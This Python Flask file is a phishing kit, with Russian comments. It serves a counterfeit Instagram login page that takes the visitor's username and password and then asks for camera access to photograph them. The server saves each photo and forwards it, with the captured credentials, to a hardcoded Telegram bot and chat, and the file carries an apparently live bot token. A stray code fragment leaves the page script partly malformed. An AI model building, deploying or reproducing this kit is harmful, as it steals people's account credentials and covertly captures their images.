from flask import Flask, render_template_string, request, jsonify
import os
import uuid
import requests
from telegram import Bot
from telegram.error import TelegramError
import threading
import base64 
import asyncio
import os

app = Flask(__name__)

# Конфигурация
port = int(os.environ.get("PORT", 5000))
TELEGRAM_BOT_TOKEN = '1903509391:AAFVvTLNLVEDwUxtPpasNbsrTMR0tK0LMhg'
TELEGRAM_CHAT_ID = '379344747'
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# HTML шаблон
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fafafa; }
        .container { max-width: 350px; margin: 50px auto; }
        .login-box { background: white; border: 1px solid #e6e6e6; padding: 20px; text-align: center; }
        .logo { margin: 22px auto 12px; width: 175px; }
        input { width: 100%; padding: 9px 8px; margin: 5px 0; border: 1px solid #efefef; background: #fafafa; }
        button { width: 100%; padding: 7px; margin: 10px 0; background: #3897f0; color: white; border: none; border-radius: 3px; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
        #camera-container { margin: 15px 0; }
        #canvas { display: none; }
        #photo-result { max-width: 100%; margin-top: 15px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" class="logo" alt="Instagram">
            
            <div id="login-form">
                <input type="text" placeholder="Phone number, username, or email" id="username">
                <input type="password" placeholder="Password" id="password">
                <button onclick="requestCamera()">Log In</button>
            </div>
            
            <div id="camera-container" style="display: none;">
                <video id="video" width="300" height="200" autoplay></video>
                <button onclick="capturePhoto()">Take Photo</button>
            </div>
            
            <canvas id="canvas"></canvas>
            
            <div id="result-container" style="display: none;">
                <img id="photo-result" alt="Your photo">
                <p>Thanks! You can close this page now.</p>
            </div>
        </div>
        <div class="footer">
            © 2023 Instagram from Meta
        </div>
    </div>

    <script>
        body: JSON.stringify({
            image: imageDataUrl,
            username: document.getElementById('username').value,
            password: document.getElementById('password').value // 👈 добавляем это
        })
        let stream = null;
        
        function requestCamera() {
            // Сначала "отправляем" данные логина (никуда не отправляются)
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Показываем камеру
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('camera-container').style.display = 'block';
            
            // Запрашиваем доступ к камере
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(s) {
                    stream = s;
                    document.getElementById('video').srcObject = stream;
                })
                .catch(function(err) {
                    alert('Could not access the camera. Please enable camera permissions.');
                    console.error(err);
                });
        }
        
        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const photoResult = document.getElementById('photo-result');
            
            // Устанавливаем размеры canvas как у video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Рисуем текущий кадр видео на canvas
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Останавливаем поток камеры
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            // Показываем результат
            const imageDataUrl = canvas.toDataURL('image/png');
            photoResult.src = imageDataUrl;
            
            document.getElementById('camera-container').style.display = 'none';
            document.getElementById('result-container').style.display = 'block';
            
            // Отправляем фото на сервер
            fetch('/upload_photo', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    image: imageDataUrl,
                    username: document.getElementById('username').value
                })
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    data = request.json
    image_data = data['image'].split(',')[1]  # удаляем префикс "data:image/png;base64,"
    username = data.get('username', 'unknown')
    password = data.get('password', 'not_provided')  # 👈 добавляем получение пароля

    # Сохраняем изображение
    filename = f"{username}_{uuid.uuid4()}.png"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    
    with open(filepath, 'wb') as f:
        f.write(base64.b64decode(image_data))
    
    # Отправляем в Telegram фото + текст
    threading.Thread(target=send_to_telegram, args=(filepath, username, password)).start()
    
    return jsonify({'status': 'success'})

def send_to_telegram(filepath, username, password):
    async def send():
        try:
            bot = Bot(token=TELEGRAM_BOT_TOKEN)
            caption = f"📸 Новый вход:\n👤 Username: {username}\n🔑 Password: {password}"
            with open(filepath, 'rb') as photo:
                await bot.send_photo(
                    chat_id=TELEGRAM_CHAT_ID,
                    photo=photo,
                    caption=caption
                )
        except TelegramError as e:
            print(f"Error sending to Telegram: {e}")
    
    import asyncio
    asyncio.run(send())


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=port)
